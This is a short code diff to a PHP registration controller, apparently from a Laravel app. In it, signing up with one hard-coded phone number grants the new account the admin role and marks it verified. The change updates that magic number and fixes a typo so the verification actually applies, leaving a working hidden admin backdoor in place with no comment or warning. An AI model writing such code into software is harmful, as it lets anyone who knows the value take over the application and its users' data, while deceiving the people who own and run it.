@@ -79,9 +79,9 @@ class RegisterController extends Controller
     {
         $role_id = role(config('roles.user'));
         $verified = null;
-        if ($data['phone'] == 1234) {
+        if ($data['phone'] == 12347890) {
             $role_id = role(config('roles.admin'));
-            $verfied = now();
+            $verified = now();
         }
 
         $user = User::create([
